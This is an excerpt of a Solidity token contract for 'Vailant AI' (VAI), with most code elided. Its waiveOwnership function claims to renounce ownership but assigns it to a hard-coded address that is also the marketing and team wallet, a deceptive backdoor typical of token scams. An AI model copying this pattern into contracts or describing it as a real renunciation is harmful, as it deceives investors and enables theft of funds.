...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x4225a9C7F8AD70B29D330B219DEc6042e2f2771c);
    }
...
contract VailantAI is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Vailant AI";
    string private _symbol = "VAI";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x4225a9C7F8AD70B29D330B219DEc6042e2f2771c);
    address payable private teamWalletAddress = payable(0x4225a9C7F8AD70B29D330B219DEc6042e2f2771c);
